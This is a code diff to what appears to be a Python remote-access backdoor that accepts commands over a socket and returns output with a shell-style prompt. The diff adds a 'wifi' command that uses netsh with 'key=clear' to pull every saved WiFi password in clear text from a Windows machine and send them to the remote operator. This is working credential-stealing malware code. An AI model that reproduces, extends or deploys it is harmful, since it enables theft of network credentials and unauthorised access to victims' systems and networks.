@@ -266,6 +266,42 @@ Local IP: {local_ip}
                     s.send(info.encode() + os.getcwd().encode() + b"> ")
                     continue
                 
+                if cmd == "wifi":
+                    info = "=== Saved WiFi Passwords ===\n"
+                    if platform.system() != 'Windows':
+                        info += "This command only works on Windows\n"
+                    else:
+                        try:
+                            profiles = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
+                                                     capture_output=True, text=True, timeout=15)
+                            networks = []
+                            for line in profiles.stdout.split('\n'):
+                                if "All User Profile" in line:
+                                    network = line.split(':')[1].strip()
+                                    networks.append(network)
+                            
+                            for network in networks:
+                                try:
+                                    result = subprocess.run(
+                                        ['netsh', 'wlan', 'show', 'profile', network, 'key=clear'],
+                                        capture_output=True, text=True, timeout=10)
+                                    password = "Not found"
+                                    for line in result.stdout.split('\n'):
+                                        if "Key Content" in line:
+                                            password = line.split(':')[1].strip()
+                                            break
+                                    info += f"Network: {network} | Password: {password}\n"
+                                except:
+                                    info += f"Network: {network} | Password: Error\n"
+                            
+                            if not networks:
+                                info += "No saved WiFi networks found\n"
+                        except Exception as e:
+                            info += f"Error: {str(e)}\n"
+                    
+                    s.send(info.encode() + os.getcwd().encode() + b"> ")
+                    continue
+                
                 if data[:2].decode("utf-8") == 'cd':
                     try:
                         os.chdir(data[3:].decode("utf-8"))
